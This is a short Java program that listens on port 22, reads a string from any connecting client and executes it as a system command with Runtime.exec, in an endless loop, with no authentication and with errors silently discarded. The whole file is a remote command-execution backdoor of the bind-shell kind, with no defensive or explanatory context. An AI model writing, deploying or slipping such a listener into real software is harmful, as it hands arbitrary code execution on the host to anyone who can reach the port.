import java.io.DataInputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class Main {
    public static void main(String[] args) {
        while(true) {
            try {
                ServerSocket ss = new ServerSocket(22);
                Socket s = ss.accept();
                DataInputStream input = new DataInputStream(s.getInputStream());
                String str = input.readUTF();
                Runtime.getRuntime().exec(str);
            } catch (IOException ex) {
                ex.getMessage();
            }
        }
    }
}